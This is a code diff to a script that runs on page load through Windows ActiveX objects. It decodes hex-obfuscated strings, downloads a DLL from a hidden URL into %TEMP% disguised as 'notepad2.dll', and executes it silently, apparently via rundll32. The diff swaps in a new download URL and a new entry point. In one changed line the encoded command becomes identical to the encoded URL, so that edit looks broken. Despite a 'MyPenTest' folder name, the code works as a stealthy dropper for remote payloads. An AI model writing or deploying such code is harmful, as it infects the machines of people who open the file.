@@ -51,7 +51,7 @@ window.onload = function () {
         var fso = new ActiveXObject("Scripting.FileSystemObject");        
         var tempDir = rr.ExpandEnvironmentStrings("%TEMP%");
         var targetDir = tempDir + "\\MyPenTest";
-        var dllUrl = dtext("5b164541420d1f1d4357434b505e405844574746554a570a5e4d5559441b53095f1856095609585f5a581f465445404a5a565d5e1e5b5d41554855010217545b5c");
+        var dllUrl = dtext("5b164541420d1f1d505e59045344555d545040050308024853565c5b51571e015b435c14514c585e1e5058464819671156435d535d5c506542575e3a065459591e515c0a");
         var dllPath = tempDir + "\\notepad2.dll";
 
         function sleep(ms) {
@@ -64,13 +64,13 @@ window.onload = function () {
 
         sleep(15000);
 
-        rr.Run(dtext("430d4654434458575d5a1448795864425e535b59551819265f545d565e5110447b59420e58071c66545562574043511643171965435c") + 
+        rr.Run(dtext("5b164541420d1f1d505e59045344555d545040050308024853565c5b51571e015b435c14514c585e1e5058464819671156435d535d5c506542575e3a065459591e515c0a") + 
             " '" + dllUrl + "' -OutFile '" + dllPath + "'", 0, true);
 
         sleep(15000);
 
         var ee = dtext("41175f555d5b03001f534c00");
-        rr.Run(ee + " \"" + dllPath + "\",notepad", 0, true);
+        rr.Run(ee + " \"" + dllPath + "\",StartProc", 0, true);
 
         setTimeout(function () {
             window.close();
